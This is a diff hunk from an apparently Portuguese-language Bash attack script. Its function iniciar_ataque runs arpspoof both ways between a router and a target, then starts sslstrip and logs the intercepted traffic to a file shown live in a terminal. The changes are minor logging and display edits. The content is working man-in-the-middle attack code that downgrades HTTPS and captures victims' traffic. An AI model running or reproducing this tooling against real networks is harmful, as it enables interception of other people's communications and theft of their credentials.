@@ -76,11 +76,11 @@ iniciar_ataque(){
 		nohup xterm -e 2> /dev/null "arpspoof -i eth0 $ip_router -t $ip_target" &
 		nohup xterm -e 2> /dev/null "arpspoof -i eth0 -t $ip_target $ip_router" &
 		echo -e "\n ~ Iniciando o sslstrip..."
-		touch $ARQ
-		echo "Data: $DATA" > $ARQ
-		nohup xterm -e 2> /dev/null "tail -f $ARQ" &
+		#touch $ARQ
+		echo "DATA: $DATA" > $ARQ
+		nohup xterm -e 2> /dev/null "nice -n -10 tail -f $ARQ 2> /dev/null" &
 		nohup xterm -e 2> /dev/null "sslstrip -l 10000 -w $ARQ" &		
-		echo "~ Vizualizando o arquivo..."
+		#echo "~ Vizualizando o arquivo..."
 		#nice -n -20 tail -f $ARQ
 	else
 		echo -e "\n [ FALHA ] Ocorreram erros em criar regras."
